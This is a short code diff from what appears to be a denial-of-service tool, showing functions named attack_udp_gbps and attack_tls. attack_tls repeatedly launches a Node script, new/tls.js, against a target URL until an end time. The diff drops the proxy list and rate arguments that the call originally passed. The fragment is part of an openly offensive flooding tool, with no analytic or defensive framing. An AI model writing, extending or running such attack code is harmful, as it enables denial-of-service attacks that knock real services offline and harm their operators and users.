@@ -66,7 +66,7 @@ def attack_udp_gbps(ip, port, end_time, size):
 def attack_tls(url, end_time):
     while time.time() < end_time:
         try:
-            subprocess.run(["node", "new/tls.js", url, str(end_time), '20', 'proxys.txt', '10000'])
+            subprocess.run(["node", "new/tls.js", url, str(end_time)])
         except Exception as e:
             print("Error:", e)
             continue
